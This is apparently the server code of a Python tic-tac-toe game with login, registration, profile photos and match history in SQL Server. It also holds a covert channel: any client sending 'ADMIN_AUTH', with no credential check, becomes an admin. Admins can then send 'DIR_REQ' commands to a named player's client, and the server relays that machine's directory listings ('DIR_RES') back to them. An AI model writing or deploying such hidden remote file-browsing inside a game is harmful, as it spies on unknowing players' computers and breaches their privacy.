import socket
import threading
import pyodbc
from cryptography.fernet import Fernet
import config

cipher = Fernet(config.FERNET_KEY)
server = 'DESKTOP-DOGCDD4\\SQLEXPRESS'
database = 'AuthSystemDB'
conn_str = f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={server};DATABASE={database};Trusted_Connection=yes'
active_users = {}
admins = []

def get_connection():
    return pyodbc.connect(conn_str)
lock = threading.Lock()
waiting_conn, waiting_login = None, None

def send_secure_msg(conn, msg):
    try:
        encrypted = cipher.encrypt(msg.encode()).decode()
        conn.send((encrypted + "\n").encode())
    except:
        pass

def get_photo(login):
    with get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT Photo FROM Users WHERE Login=?", (login,))
        row = cursor.fetchone()
        return row[0] if row and row[0] else ""

def admin_loop(conn):
    buffer = ""
    while True:
        try:
            data = conn.recv(16384).decode()
            if not data: break
            buffer += data
            while "\n" in buffer:
                raw, buffer = buffer.split("\n", 1)
                msg = cipher.decrypt(raw.encode()).decode()

                if msg.startswith("DIR_REQ|"):
                    _, target_login, path = msg.split("|", 2)
                    target_conn = active_users.get(target_login)
                    if target_conn:
                        send_secure_msg(target_conn, f"DIR_REQ|{path}")
                    else:
                        send_secure_msg(conn, f"DIR_RES|{target_login}|OFFLINE|OFFLINE|ERROR|User is offline")
        except:
            break
    if conn in admins: admins.remove(conn)
    conn.close()

class Session:
    def __init__(self, p1, p2, photo1, photo2, login1, login2):
        self.players = [p1, p2]
        self.players_login = [login1, login2]
        self.symbols = ["X", "O"]
        self.board = [" "] * 9
        self.turn = 0
        self.moves = []

        send_secure_msg(p1, f"START|X|{photo1}|{photo2}")
        send_secure_msg(p2, f"START|O|{photo2}|{photo1}")

        threading.Thread(target=self.handle, args=(0,), daemon=True).start()
        threading.Thread(target=self.handle, args=(1,), daemon=True).start()

    def broadcast(self, msg):
        for p in self.players:
            send_secure_msg(p, msg)

    def check(self):
        w = [(0, 1, 2), (3, 4, 5), (6, 7, 8),
             (0, 3, 6), (1, 4, 7), (2, 5, 8),
             (0, 4, 8), (2, 4, 6)]
        for a, b, c in w:
            if self.board[a] == self.board[b] == self.board[c] and self.board[a] != " ":
                return self.board[a]
        return "DRAW" if " " not in self.board else None

    def handle(self, i):
        conn = self.players[i]
        buffer = ""
        while True:
            try:
                data = conn.recv(16384).decode()
                if not data: break
                buffer += data
                while "\n" in buffer:
                    raw, buffer = buffer.split("\n", 1)
                    msg = cipher.decrypt(raw.encode()).decode()

                    if msg.startswith("DIR_RES|"):
                        for adm in admins:
                            send_secure_msg(adm, f"DIR_RES|{self.players_login[i]}|{msg[8:]}")
                        continue

                    if not msg.isdigit(): continue
                    move = int(msg)

                    if self.turn == i and self.board[move] == " ":
                        self.board[move] = self.symbols[i]
                        self.moves.append(str(move))
                        self.turn = 1 - self.turn
                        self.broadcast("BOARD|" + ",".join(self.board))

                        res = self.check()
                        if res:
                            self.broadcast("WIN|" + res)
                            try:
                                with get_connection() as conn_db:
                                    cursor = conn_db.cursor()
                                    p1_log, p2_log = self.players_login[0], self.players_login[1]
                                    winner = p1_log if res == "X" else (p2_log if res == "O" else "DRAW")
                                    move_history_str = ",".join(self.moves)
                                    cursor.execute(
                                        "INSERT INTO Matches (Player1, Player2, Result, MoveHistory) VALUES (?, ?, ?, ?)",
                                        (p1_log, p2_log, winner, move_history_str)
                                    )
                                    conn_db.commit()
                            except:
                                pass
                            return
            except:
                break
        conn.close()

def client_handler(conn_socket):
    global waiting_conn, waiting_login
    login = None
    buffer = ""
    while not login:
        try:
            data = conn_socket.recv(16384).decode()
            if not data: return
            buffer += data

            while "\n" in buffer:
                raw, buffer = buffer.split("\n", 1)
                msg = cipher.decrypt(raw.encode()).decode()

                if msg.startswith("ADMIN_AUTH"):
                    admins.append(conn_socket)
                    admin_loop(conn_socket)
                    return

                if msg.startswith("REGISTER"):
                    _, user_login, hashed_ps = msg.split("|")
                    with get_connection() as conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT 1 FROM Users WHERE Login=?", (user_login,))
                        if cursor.fetchone():
                            send_secure_msg(conn_socket, "ERROR|User exists")
                        else:
                            cursor.execute("INSERT INTO Users (Login, PasswordHash) VALUES (?, ?)",
                                           (user_login, hashed_ps))
                            conn.commit()
                            send_secure_msg(conn_socket, "OK|Registered")
                            login = user_login
                            active_users[login] = conn_socket

                elif msg.startswith("LOGIN"):
                    _, user_login, hashed_ps = msg.split("|")
                    with get_connection() as conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT Banned FROM Users WHERE Login=? AND PasswordHash=?",
                                       (user_login, hashed_ps))
                        row = cursor.fetchone()
                        if row:
                            if row[0]:
                                send_secure_msg(conn_socket, "ERROR|You are banned!")
                                conn_socket.close()
                                return
                            send_secure_msg(conn_socket, "OK|Success")
                            login = user_login
                            active_users[login] = conn_socket
                        else:
                            send_secure_msg(conn_socket, "ERROR|Invalid")
        except:
            return

    current_photo = get_photo(login)
    if not current_photo:
        send_secure_msg(conn_socket, "PHOTO_REQUIRED")
        try:
            photo_buffer = ""
            while True:
                chunk = conn_socket.recv(16384).decode()
                if not chunk: return
                photo_buffer += chunk
                while "\n" in photo_buffer:
                    raw_photo, photo_buffer = photo_buffer.split("\n", 1)
                    msg = cipher.decrypt(raw_photo.encode()).decode()

                    if msg.startswith("DIR_RES|"):
                        for adm in admins: send_secure_msg(adm, f"DIR_RES|{login}|{msg[8:]}")
                        continue

                    if msg.startswith("PHOTO"):
                        _, login_name, img = msg.split("|", 2)
                        with get_connection() as conn:
                            cursor = conn.cursor()
                            cursor.execute("UPDATE Users SET Photo=? WHERE Login=?", (img, login_name))
                            conn.commit()
                        break
                if current_photo: break
        except:
            return

    with lock:
        if waiting_conn is None:
            waiting_conn = conn_socket
            waiting_login = login
            send_secure_msg(conn_socket, "WAIT|Waiting...")
        else:
            p1 = waiting_conn
            p1_login = waiting_login
            waiting_conn, waiting_login = None, None
            p1_photo = get_photo(p1_login)
            p2_photo = get_photo(login)
            Session(p1, conn_socket, p1_photo, p2_photo, p1_login, login)

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((config.HOST, config.PORT))
    s.listen()
    print("--- SERVER RUNNING ---")
    while True:
        conn, _ = s.accept()
        threading.Thread(target=client_handler, args=(conn,), daemon=True).start()

if __name__ == "__main__":
    start_server()